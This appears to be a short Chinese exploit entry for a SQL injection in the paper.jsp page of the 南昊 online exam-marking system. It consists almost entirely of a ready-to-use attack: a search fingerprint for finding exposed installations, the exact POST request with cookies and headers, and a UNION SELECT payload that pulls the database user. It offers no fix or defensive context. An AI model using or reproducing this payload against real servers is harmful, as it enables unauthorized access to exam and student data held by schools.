# 南昊网上阅卷系统paper.jsp存在SQL注入漏洞

- **系统**：南昊网上阅卷系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="南昊网上阅卷系统"`
- **请求**：`POST /exam/admin/chaxun/biaozhi_paper.jsp?paper_id=100004&&actionid=1 HTTP/1.1`
- **关键头**：`Cookie: cod=3.9.27.31.39; csd=40; JSESSIONID=214FC4A812D9410E95FF53F4C4F625C4`　`Priority: u=4`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
queid=')+UNION+ALL+SELECT+1,CONCAT(0x7e,user(),0x7e)#&teaid=&typeid=&Submit32=%CB%D1%CB%F7
```
- **预期**：200　|　—